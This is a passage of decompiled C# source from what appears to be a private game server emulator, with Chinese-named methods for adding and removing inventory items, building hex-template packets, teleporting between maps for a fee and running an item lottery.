			Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array, 22, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 减去物品(int 位置, int 数量)
		{
			try
			{
				if (数量 < 0)
				{
					return;
				}
				using (发包类 发包类 = new 发包类())
				{
					发包类.Write1(1);
					发包类.Write1(位置);
					发包类.Write2(0);
					发包类.Write(装备栏包裹[位置].Get物品ID);
					发包类.Write8(数量);
					发包类.Write8(0L);
					if (base.Client != null)
					{
						base.Client.SendPak(发包类, 8704, base.人物全服ID);
					}
				}
				if (BitConverter.ToInt32(装备栏包裹[位置].物品数量, 0) <= 数量)
				{
					装备栏包裹[位置].物品_byte = new byte[World.数据库单个物品大小];
					return;
				}
				byte[] bytes = BitConverter.GetBytes(BitConverter.ToInt32(装备栏包裹[位置].物品数量, 0) - 数量);
				int fLD_MAGIC = 装备栏包裹[位置].FLD_MAGIC0;
				装备栏包裹[位置].物品数量 = BitConverter.GetBytes(0);
				if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[位置].物品ID, 0), out var value))
				{
					byte[] array = new byte[56];
					Buffer.BlockCopy(BitConverter.GetBytes(fLD_MAGIC), 0, array, 0, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(value.FLD_MAGIC1), 0, array, 4, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(value.FLD_MAGIC2), 0, array, 8, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(value.FLD_MAGIC3), 0, array, 12, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(value.FLD_MAGIC4), 0, array, 16, 4);
					增加物品(装备栏包裹[位置].物品全局ID, 装备栏包裹[位置].物品ID, 装备栏包裹[位置].物品位置, bytes, array);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "减去物品 出错[" + base.Userid + "][" + base.UserName + "] 位置[" + 位置 + "] 数量[" + 数量 + "] 物品名称[" + 装备栏包裹[位置].得到物品名称() + "]装备栏包裹数量[" + BitConverter.ToInt32(装备栏包裹[位置].物品数量, 0) + "]" + ex.Message);
			}
		}

		public void 物品减去属性数量(int 位置, int 减去数量)
		{
			try
			{
				if (减去数量 >= 0)
				{
					byte[] array = new byte[4];
					byte[] array2 = new byte[4];
					byte[] array3 = new byte[8];
					byte[] array4 = new byte[4];
					byte[] array5 = new byte[56];
					Buffer.BlockCopy(装备栏包裹[位置].物品_byte, 12, array2, 0, 4);
					Buffer.BlockCopy(装备栏包裹[位置].物品_byte, 16, array, 0, 4);
					Buffer.BlockCopy(装备栏包裹[位置].物品_byte, 8, array4, 0, 4);
					Buffer.BlockCopy(装备栏包裹[位置].物品_byte, 0, array3, 0, 8);
					int num = BitConverter.ToInt32(array, 0) - 减去数量;
					if (num <= 2000000000)
					{
						减去物品(位置, 1);
						return;
					}
					减去物品(位置, BitConverter.ToInt32(array2, 0));
					Buffer.BlockCopy(BitConverter.GetBytes(num), 0, array5, 0, 4);
					增加物品(array3, array4, 位置, array2, array5);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "物品减去属性数量出错 [" + base.Userid + "][" + base.UserName + "] 位置[" + 位置 + "] 减去数量[" + 减去数量 + "]" + ex.Message);
			}
		}

		public void 增加物品(byte[] 物品全局ID, byte[] 物品ID, int 位置, byte[] 数量, byte[] 物品属性)
		{
			try
			{
				if (!World.Itme.TryGetValue(BitConverter.ToInt32(物品ID, 0), out var value))
				{
					return;
				}
				byte[] array = Converter.hexStringToByte("AA557200940223006400010000008716E567818320060208AF2F000000000100000000000000010F020F00020000470D0300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000C3E755AA");
				byte[] array2 = new byte[World.数据库单个物品大小];
				if (value.FLD_SIDE != 0)
				{
					byte[] array3 = new byte[4];
					Buffer.BlockCopy(物品属性, 0, array3, 0, 4);
					物品类 物品类2 = 得到人物物品类型(BitConverter.ToInt32(物品ID, 0), BitConverter.ToInt32(array3, 0));
					if (BitConverter.ToInt32(物品ID, 0) == 1008000044 || BitConverter.ToInt32(物品ID, 0) == 1008000045)
					{
						物品全局ID = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
						数量 = BitConverter.GetBytes(BitConverter.ToInt32(数量, 0));
					}
					else if (物品类2 != null)
					{
						位置 = 物品类2.物品位置;
						物品全局ID = 物品类2.物品全局ID;
						数量 = BitConverter.GetBytes(BitConverter.ToInt32(物品类2.物品数量, 0) + BitConverter.ToInt32(数量, 0));
					}
				}
				else
				{
					数量 = BitConverter.GetBytes(1);
				}
				Buffer.BlockCopy(物品全局ID, 0, array2, 0, 8);
				Buffer.BlockCopy(物品ID, 0, array2, 8, 4);
				Buffer.BlockCopy(数量, 0, array2, 12, 4);
				Buffer.BlockCopy(物品属性, 0, array2, 16, 55);
				Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array, 40, 2);
				Buffer.BlockCopy(array2, 0, array, 14, 12);
				Buffer.BlockCopy(array2, 12, array, 30, 4);
				Buffer.BlockCopy(array2, 16, array, 46, 55);
				装备栏包裹[位置].物品_byte = array2;
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "增加物品出错2 [" + base.Userid + "][" + base.UserName + "] 位置[" + 位置 + "] 数量[" + BitConverter.ToInt32(数量, 0) + "]" + ex.Message);
			}
		}

		public void 增加物品(byte[] 物品全局ID, byte[] 物品ID, int 位置, byte[] 数量, byte[] 物品属性, bool 绑定)
		{
			try
			{
				if (!World.Itme.TryGetValue(BitConverter.ToInt32(物品ID, 0), out var value))
				{
					return;
				}
				byte[] array = Converter.hexStringToByte("AA557200940223006400010000008716E567818320060208AF2F000000000100000000000000010F020F00020000470D0300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000C3E755AA");
				byte[] array2 = new byte[World.数据库单个物品大小];
				if (value.FLD_SIDE != 0)
				{
					byte[] array3 = new byte[4];
					Buffer.BlockCopy(物品属性, 0, array3, 0, 4);
					物品类 物品类2 = 得到人物物品类型(BitConverter.ToInt32(物品ID, 0), BitConverter.ToInt32(array3, 0));
					if (BitConverter.ToInt32(物品ID, 0) == 1008000044 || BitConverter.ToInt32(物品ID, 0) == 1008000045)
					{
						物品全局ID = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
						数量 = BitConverter.GetBytes(BitConverter.ToInt32(数量, 0));
					}
					else if (物品类2 != null)
					{
						位置 = 物品类2.物品位置;
						物品全局ID = 物品类2.物品全局ID;
						数量 = BitConverter.GetBytes(BitConverter.ToInt32(物品类2.物品数量, 0) + BitConverter.ToInt32(数量, 0));
					}
				}
				else
				{
					数量 = BitConverter.GetBytes(1);
				}
				Buffer.BlockCopy(物品全局ID, 0, array2, 0, 8);
				Buffer.BlockCopy(物品ID, 0, array2, 8, 4);
				Buffer.BlockCopy(数量, 0, array2, 12, 4);
				Buffer.BlockCopy(物品属性, 0, array2, 16, 物品属性.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array, 40, 2);
				Buffer.BlockCopy(array2, 0, array, 14, 12);
				Buffer.BlockCopy(array2, 12, array, 30, 4);
				Buffer.BlockCopy(array2, 16, array, 46, 物品属性.Length);
				if (绑定)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array2, 72, 1);
					Buffer.BlockCopy(BitConverter.GetBytes(BitConverter.ToInt32(物品ID, 0) + 20000), 0, array, 22, 4);
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array2, 72, 1);
				}
				装备栏包裹[位置].物品_byte = array2;
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "增加物品出错 [" + base.Userid + "][" + base.UserName + "] 位置[" + 位置 + "] 数量[" + BitConverter.ToInt32(数量, 0) + "]" + ex.Message);
			}
		}

		public void 增加物品4(byte[] 物品全局ID, byte[] 物品ID, int 位置, byte[] 数量, byte[] 物品属性)
		{
			try
			{
				if (!World.Itme.TryGetValue(BitConverter.ToInt32(物品ID, 0), out var value))
				{
					return;
				}
				byte[] array = Converter.hexStringToByte("AA55720088040D006C0001000000AD20A92C252D410645CD9A3B000000000100000000000000010B02140002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
				byte[] array2 = new byte[World.数据库单个物品大小];
				if (value.FLD_SIDE != 0)
				{
					byte[] array3 = new byte[4];
					Buffer.BlockCopy(物品属性, 0, array3, 0, 4);
					物品类 物品类2 = 得到人物物品类型(BitConverter.ToInt32(物品ID, 0), BitConverter.ToInt32(array3, 0));
					if (BitConverter.ToInt32(物品ID, 0) == 1008000044 || BitConverter.ToInt32(物品ID, 0) == 1008000045)
					{
						物品全局ID = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
						数量 = BitConverter.GetBytes(BitConverter.ToInt32(数量, 0));
					}
					else if (物品类2 != null)
					{
						位置 = 物品类2.物品位置;
						物品全局ID = 物品类2.物品全局ID;
						数量 = BitConverter.GetBytes(BitConverter.ToInt32(物品类2.物品数量, 0) + BitConverter.ToInt32(数量, 0));
					}
				}
				else
				{
					数量 = BitConverter.GetBytes(1);
				}
				Buffer.BlockCopy(物品全局ID, 0, array2, 0, 8);
				Buffer.BlockCopy(物品ID, 0, array2, 8, 4);
				Buffer.BlockCopy(数量, 0, array2, 12, 4);
				Buffer.BlockCopy(物品属性, 0, array2, 16, 物品属性.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array, 40, 2);
				Buffer.BlockCopy(array2, 0, array, 14, 12);
				Buffer.BlockCopy(array2, 12, array, 30, 4);
				Buffer.BlockCopy(array2, 16, array, 43, 物品属性.Length);
				装备栏包裹[位置].物品_byte = array2;
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "增加物品4出错 [" + base.Userid + "][" + base.UserName + "] 位置[" + 位置 + "] 数量[" + BitConverter.ToInt32(数量, 0) + "]" + ex.Message);
			}
		}

		public void 增加物品2(byte[] 物品全局ID, byte[] 物品ID, int 位置, byte[] 数量, byte[] 物品属性)
		{
			try
			{
				if (!World.Itme.TryGetValue(BitConverter.ToInt32(物品ID, 0), out var value))
				{
					return;
				}
				byte[] array = Converter.hexStringToByte("AA55720094020D006400010000008716E567818320060208AF2F000000000100000000000000010F020F00020000470D0300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000C3E755AA");
				byte[] array2 = new byte[World.数据库单个物品大小];
				if (value.FLD_SIDE != 0)
				{
					byte[] array3 = new byte[4];
					Buffer.BlockCopy(物品属性, 0, array3, 0, 4);
					物品类 物品类2 = 得到人物物品类型(BitConverter.ToInt32(物品ID, 0), BitConverter.ToInt32(array3, 0));
					if (BitConverter.ToInt32(物品ID, 0) == 1008000044 || BitConverter.ToInt32(物品ID, 0) == 1008000045)
					{
						物品全局ID = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
						数量 = BitConverter.GetBytes(BitConverter.ToInt32(数量, 0));
					}
					else if (物品类2 != null)
					{
						位置 = 物品类2.物品位置;
						物品全局ID = 物品类2.物品全局ID;
						数量 = BitConverter.GetBytes(BitConverter.ToInt32(物品类2.物品数量, 0) + BitConverter.ToInt32(数量, 0));
					}
				}
				else
				{
					数量 = BitConverter.GetBytes(1);
				}
				Buffer.BlockCopy(物品全局ID, 0, array2, 0, 8);
				Buffer.BlockCopy(物品ID, 0, array2, 8, 4);
				Buffer.BlockCopy(数量, 0, array2, 12, 4);
				Buffer.BlockCopy(物品属性, 0, array2, 16, 物品属性.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array, 40, 2);
				Buffer.BlockCopy(array2, 0, array, 14, 12);
				Buffer.BlockCopy(array2, 12, array, 30, 4);
				Buffer.BlockCopy(array2, 16, array, 46, 物品属性.Length);
				装备栏包裹[位置].物品_byte = array2;
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "增加物品2出错 [" + base.Userid + "][" + base.UserName + "] 位置[" + 位置 + "] 数量[" + BitConverter.ToInt32(数量, 0) + "]" + ex.Message);
			}
		}

		public int 天地灵符()
		{
			if (追加状态列表 != null)
			{
				if (GetAddState(1008001026))
				{
					return 1;
				}
				if (GetAddState(1008001027))
				{
					return 2;
				}
				if (GetAddState(1008001028))
				{
					return 3;
				}
				if (GetAddState(1008001029))
				{
					return 4;
				}
				if (GetAddState(1008001030))
				{
					return 5;
				}
				if (GetAddState(1008001031))
				{
					return 6;
				}
				if (GetAddState(1008001032))
				{
					return 7;
				}
				if (GetAddState(1008001033))
				{
					return 8;
				}
				if (GetAddState(1008001034))
				{
					return 9;
				}
				if (GetAddState(1008001035))
				{
					return 10;
				}
			}
			return 0;
		}

		public ConcurrentDictionary<int, ItmeClass> 取职业物品(int RESIDE2, int job, int zx, int sex, int level)
		{
			ConcurrentDictionary<int, ItmeClass> concurrentDictionary = new ConcurrentDictionary<int, ItmeClass>();
			foreach (ItmeClass value in World.Itme.Values)
			{
				if (value.FLD_RESIDE2 == RESIDE2 && value.FLD_RESIDE1 == job && (value.FLD_SEX == sex || value.FLD_SEX == 0) && value.FLD_LEVEL == level && value.FLD_RECYCLE_MONEY != 0)
				{
					concurrentDictionary.TryAdd(value.FLD_PID, value);
				}
			}
			return null;
		}

		public void 捡得到物品(int 位置, byte[] 物品数量, byte[] 物品全局ID, byte[] 物品ID, byte[] 物品属性)
		{
			if (BitConverter.ToInt32(物品数量, 0) <= 0 || !World.Itme.TryGetValue(BitConverter.ToInt32(物品ID, 0), out var value))
			{
				return;
			}
			if (value.FLD_QUESTITEM == 0)
			{
				byte[] array = Converter.hexStringToByte("AA55790047030D006B0001000000760849BF978FD0060608AF2F000000000200000000000000010C020F000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000998755AA");
				Buffer.BlockCopy(物品全局ID, 0, array, 14, 8);
				Buffer.BlockCopy(物品ID, 0, array, 22, 4);
				Buffer.BlockCopy(物品数量, 0, array, 30, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array, 40, 2);
				Buffer.BlockCopy(物品属性, 0, array, 46, 物品属性.Length);
				byte[] array2 = new byte[World.数据库单个物品大小];
				Buffer.BlockCopy(物品全局ID, 0, array2, 0, 8);
				Buffer.BlockCopy(物品ID, 0, array2, 8, 4);
				Buffer.BlockCopy(物品数量, 0, array2, 12, 4);
				Buffer.BlockCopy(物品属性, 0, array2, 16, 物品属性.Length);
				装备栏包裹[位置].物品_byte = array2;
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send多包(array, array.Length);
				}
			}
			else
			{
				设置任务物品(BitConverter.ToInt32(物品ID, 0), BitConverter.ToInt32(物品数量, 0));
			}
		}

		public void 假人增加物品带属性(Players 假人, int 物品ID, int 位置, int 数量, int 物品属性0, int 物品属性1, int 物品属性2, int 物品属性3, int 物品属性4, int 初级附魂, int 中级附魂, int 进化, int 绑定, int 使用天数)
		{
			try
			{
				if (!World.Itme.TryGetValue(物品ID, out var value))
				{
					return;
				}
				byte[] array = new byte[56];
				Buffer.BlockCopy(BitConverter.GetBytes(物品属性0), 0, array, 0, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(物品属性1), 0, array, 4, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(物品属性2), 0, array, 8, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(物品属性3), 0, array, 12, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(物品属性4), 0, array, 16, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(初级附魂), 0, array, 46, 4);
				if (中级附魂 > 0)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 22, 2);
				}
				Buffer.BlockCopy(BitConverter.GetBytes(中级附魂), 0, array, 24, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(进化), 0, array, 52, 4);
				long value2 = RxjhClass.GetDBItmeId();
				byte[] array2 = Converter.hexStringToByte("AA557200940223006400010000008716E567818320060208AF2F000000000100000000000000010F020F00020000470D0300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000C3E755AA");
				byte[] array3 = new byte[World.数据库单个物品大小];
				if (value.FLD_SIDE != 0)
				{
					物品类 物品类2 = 假人.得到人物物品类型(物品ID, 物品属性0);
					if (物品ID == 1008000044 || 物品ID == 1008000045)
					{
						value2 = RxjhClass.GetDBItmeId();
					}
					else if (物品类2 != null)
					{
						位置 = 物品类2.物品位置;
						value2 = BitConverter.ToInt64(物品类2.物品全局ID, 0);
						数量 = BitConverter.ToInt32(物品类2.物品数量, 0) + 数量;
					}
				}
				else
				{
					数量 = 1;
				}
				Buffer.BlockCopy(BitConverter.GetBytes(value2), 0, array3, 0, 8);
				Buffer.BlockCopy(BitConverter.GetBytes(物品ID), 0, array3, 8, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array3, 12, 4);
				Buffer.BlockCopy(array, 0, array3, 16, array.Length);
				if (使用天数 > 0)
				{
					DateTime value3 = new DateTime(1970, 1, 1, 8, 0, 0);
					Buffer.BlockCopy(BitConverter.GetBytes((int)DateTime.Now.Subtract(value3).TotalSeconds), 0, array3, 52, 4);
					Buffer.BlockCopy(BitConverter.GetBytes((int)DateTime.Now.AddDays(使用天数).Subtract(value3).TotalSeconds), 0, array3, 56, 4);
				}
				if (value.FLD_NJ > 0 && (value.FLD_RESIDE2 == 1 || value.FLD_RESIDE2 == 2 || value.FLD_RESIDE2 == 5 || value.FLD_RESIDE2 == 4 || value.FLD_RESIDE2 == 6))
				{
					Buffer.BlockCopy(BitConverter.GetBytes(1000), 0, array3, 60, 2);
				}
				假人.装备栏包裹[位置].物品_byte = array3;
				Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array2, 40, 2);
				Buffer.BlockCopy(array3, 0, array2, 14, 12);
				Buffer.BlockCopy(array3, 12, array2, 30, 4);
				Buffer.BlockCopy(array3, 16, array2, 46, array.Length);
				if (绑定 == 1)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array3, 72, 1);
					Buffer.BlockCopy(BitConverter.GetBytes(物品ID + 20000), 0, array2, 22, 4);
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array3, 72, 1);
				}
				Buffer.BlockCopy(BitConverter.GetBytes(假人.人物全服ID), 0, array2, 4, 2);
				if (假人.Client != null)
				{
					假人.Client.Send(array2, array2.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "假人增加物品出错 [" + base.Userid + "][" + base.UserName + "] 位置[" + 位置 + "] 数量[" + 数量 + "]" + ex.Message);
			}
		}

		public void 增加行囊物品带属性(int 物品ID, int 位置, int 数量, int 物品属性0, int 物品属性1, int 物品属性2, int 物品属性3, int 物品属性4, int 初级附魂, int 中级附魂, int 进化, int 绑定, int 使用天数)
		{
			try
			{
				if (!World.Itme.TryGetValue(物品ID, out var value))
				{
					return;
				}
				byte[] array = new byte[56];
				Buffer.BlockCopy(BitConverter.GetBytes(物品属性0), 0, array, 0, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(物品属性1), 0, array, 4, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(物品属性2), 0, array, 8, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(物品属性3), 0, array, 12, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(物品属性4), 0, array, 16, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(初级附魂), 0, array, 46, 4);
				if (中级附魂 > 0)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 22, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(中级附魂), 0, array, 24, 4);
				}
				Buffer.BlockCopy(BitConverter.GetBytes(进化), 0, array, 52, 4);
				long value2 = RxjhClass.GetDBItmeId();
				byte[] array2 = Converter.hexStringToByte("AA556A00940223006400010000008716E567818320060208AF2F000000000100000000000000010F020F00020000470D030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
				byte[] array3 = new byte[World.数据库单个物品大小];
				if (value.FLD_SIDE != 0)
				{
					物品类 物品类2 = 得到人物物品类型(物品ID, 物品属性0);
					if (物品ID == 1008000044 || 物品ID == 1008000045 || 物品ID == 1008000077 || 物品ID == 1008000078)
					{
						value2 = RxjhClass.GetDBItmeId();
					}
					else if (物品类2 != null)
					{
						位置 = 物品类2.物品位置;
						value2 = BitConverter.ToInt64(物品类2.物品全局ID, 0);
						数量 = BitConverter.ToInt32(物品类2.物品数量, 0) + 数量;
					}
				}
				else
				{
					数量 = 1;
				}
				Buffer.BlockCopy(BitConverter.GetBytes(value2), 0, array3, 0, 8);
				Buffer.BlockCopy(BitConverter.GetBytes(物品ID), 0, array3, 8, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array3, 12, 4);
				Buffer.BlockCopy(array, 0, array3, 16, array.Length);
				if (使用天数 > 0)
				{
					DateTime value3 = new DateTime(1970, 1, 1, 8, 0, 0);
					Buffer.BlockCopy(BitConverter.GetBytes((int)DateTime.Now.Subtract(value3).TotalSeconds), 0, array3, 52, 4);
					Buffer.BlockCopy(BitConverter.GetBytes((int)DateTime.Now.AddDays(使用天数).Subtract(value3).TotalSeconds), 0, array3, 56, 4);
				}
				if (value.FLD_NJ > 0 && (value.FLD_RESIDE2 == 1 || value.FLD_RESIDE2 == 2 || value.FLD_RESIDE2 == 5 || value.FLD_RESIDE2 == 4 || value.FLD_RESIDE2 == 6))
				{
					Buffer.BlockCopy(BitConverter.GetBytes(1000), 0, array3, 60, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(1000), 0, array2, 90, 2);
				}
				行囊包裹[位置].物品_byte = array3;
				Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array2, 40, 2);
				Buffer.BlockCopy(array3, 0, array2, 14, 12);
				Buffer.BlockCopy(array3, 12, array2, 30, 4);
				Buffer.BlockCopy(array3, 16, array2, 46, array.Length);
				if (绑定 == 1)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array3, 73, 1);
					Buffer.BlockCopy(BitConverter.GetBytes(物品ID + 20000), 0, array2, 22, 4);
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array3, 73, 1);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "增加行囊物品带属性出错[" + base.Userid + "][" + base.UserName + "]  位置[" + 位置 + "]  数量[" + 数量 + "]" + ex.Message);
			}
		}

		public void AddItemWithProperties(int 物品ID, int 位置, int 数量, int 物品属性0, int 物品属性1, int 物品属性2, int 物品属性3, int 物品属性4, int 初级附魂, int 中级附魂, int 进化, int 绑定, int 使用天数)
		{
			try
			{
				if (!World.Itme.TryGetValue(物品ID, out var value))
				{
					return;
				}
				byte[] array = new byte[56];
				Buffer.BlockCopy(BitConverter.GetBytes(物品属性0), 0, array, 0, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(物品属性1), 0, array, 4, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(物品属性2), 0, array, 8, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(物品属性3), 0, array, 12, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(物品属性4), 0, array, 16, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(初级附魂), 0, array, 46, 4);
				if (中级附魂 > 0)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 22, 2);
				}
				Buffer.BlockCopy(BitConverter.GetBytes(中级附魂), 0, array, 24, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(进化), 0, array, 52, 4);
				long value2 = RxjhClass.GetDBItmeId();
				byte[] array2 = Converter.hexStringToByte("AA557200940223006400010000008716E567818320060208AF2F000000000100000000000000010F020F00020000470D0300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000C3E755AA");
				byte[] array3 = new byte[World.数据库单个物品大小];
				if (value.FLD_SIDE != 0)
				{
					物品类 物品类2 = 得到人物物品类型(物品ID, 物品属性0);
					if (物品ID == 1008000044 || 物品ID == 1008000045)
					{
						value2 = RxjhClass.GetDBItmeId();
					}
					else if (物品类2 != null)
					{
						位置 = 物品类2.物品位置;
						value2 = BitConverter.ToInt64(物品类2.物品全局ID, 0);
						数量 = BitConverter.ToInt32(物品类2.物品数量, 0) + 数量;
					}
				}
				else
				{
					数量 = 1;
				}
				Buffer.BlockCopy(BitConverter.GetBytes(value2), 0, array3, 0, 8);
				Buffer.BlockCopy(BitConverter.GetBytes(物品ID), 0, array3, 8, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array3, 12, 4);
				Buffer.BlockCopy(array, 0, array3, 16, array.Length);
				if (使用天数 > 0)
				{
					DateTime value3 = new DateTime(1970, 1, 1, 8, 0, 0);
					Buffer.BlockCopy(BitConverter.GetBytes((int)DateTime.Now.Subtract(value3).TotalSeconds), 0, array3, 52, 4);
					Buffer.BlockCopy(BitConverter.GetBytes((int)DateTime.Now.AddDays(使用天数).Subtract(value3).TotalSeconds), 0, array3, 56, 4);
				}
				if (value.FLD_NJ > 0 && (value.FLD_RESIDE2 == 1 || value.FLD_RESIDE2 == 2 || value.FLD_RESIDE2 == 5 || value.FLD_RESIDE2 == 4 || value.FLD_RESIDE2 == 6))
				{
					Buffer.BlockCopy(BitConverter.GetBytes(1000), 0, array3, 60, 2);
				}
				装备栏包裹[位置].物品_byte = array3;
				Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array2, 40, 2);
				Buffer.BlockCopy(array3, 0, array2, 14, 12);
				Buffer.BlockCopy(array3, 12, array2, 30, 4);
				Buffer.BlockCopy(array3, 16, array2, 46, array.Length);
				if (绑定 == 1)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array3, 72, 1);
					Buffer.BlockCopy(BitConverter.GetBytes(物品ID + 20000), 0, array2, 22, 4);
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array3, 72, 1);
				}
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array2, array2.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "增加物品带属性出错 [" + base.Userid + "][" + base.UserName + "] 位置[" + 位置 + "] 数量[" + 数量 + "]" + ex.Message);
			}
		}

		public string 地图传送(int mapid, int x, int y)
		{
			if (World.MainServer == 0)
			{
				return "请到银币广场传送员处移动回泫勃派";
			}
			if (打开仓库中)
			{
				return "NPC打开状态无法移动";
			}
			if (base.Player_Money < 10000)
			{
				return "手续费10000元不足, 不能完成移动";
			}
			bool flag = false;
			foreach (坐标Class item in World.移动)
			{
				if (item.Rxjh_Map != mapid)
				{
					continue;
				}
				if (base.FLD_VIP == 0)
				{
					string vIP地图 = World.VIP地图;
					char[] separator = new char[1] { ';' };
					string[] array = vIP地图.Split(separator);
					string[] array2 = array;
					string[] array4 = array2;
					foreach (string b in array4)
					{
						if (item.Rxjh_name == b)
						{
							return "本地图名是会员地图，非会员不可以进入";
						}
					}
				}
				string[] array3 = World.地图锁定.Split(';');
				if (array3.Length >= 1)
				{
					for (int i = 0; i < array3.Length; i++)
					{
						if (int.Parse(array3[i]) == item.Rxjh_Map)
						{
							return "0";
						}
					}
				}
				if ((item.Rxjh_Map == 1601 || item.Rxjh_Map == 1901 || item.Rxjh_Map == 2001 || item.Rxjh_Map == 2101 || item.Rxjh_Map == 2201 || item.Rxjh_Map == 5001) && base.Player_Level < 10)
				{
					return "高级地图只允许10级以上的玩家进入";
				}
				清除怒气();
				移动(x, y, item.Rxjh_Z, mapid);
				flag = true;
				break;
			}
			if (!flag)
			{
				return "移动错误，地图名不存在";
			}
			base.Player_Money -= 10000L;
			系统提示("移动完成，收取手续费10000金币。", 50, "系统提示");
			更新金钱和负重();
			获取复查范围玩家();
			获取复查范围Npc();
			获取复查范围地面物品();
			return "移动完成，收取手续费10000金币";
		}

		public string 百宝阁抽奖(int id, int sl, int yuanbao, int 类型, int FLD_MAGIC0, int FLD_MAGIC1, int FLD_MAGIC2, int FLD_MAGIC3, int FLD_MAGIC4, int 中级魂, int 觉醒, int 进化, int 绑定, int 使用天数)
		{
			try
			{
				Random random = new Random(World.GetRandomSeed());
				int num = 得到包裹空位(this);
				ItmeClass itmeClass = new ItmeClass();
				itmeClass = ItmeClass.GetItmeID(id);
				if (num == -1)
				{
					return "没有空位了";
				}
				CheckTreasureGems();
				if (yuanbao > 0)
				{
					if (base.FLD_CJCS < yuanbao)
					{
						return "抽奖不够了";
					}
					检察抽奖数据(yuanbao, 0, "百宝抽奖");
					RxjhClass.百宝记录(base.Userid, base.UserName, id, itmeClass.ItmeNAME.ToString(), sl, yuanbao);
				}
				AddItemWithProperties(id, num, 1, FLD_MAGIC0, FLD_MAGIC1, FLD_MAGIC2, FLD_MAGIC3, FLD_MAGIC4, 觉醒, 中级魂, 进化, 绑定, 使用天数);
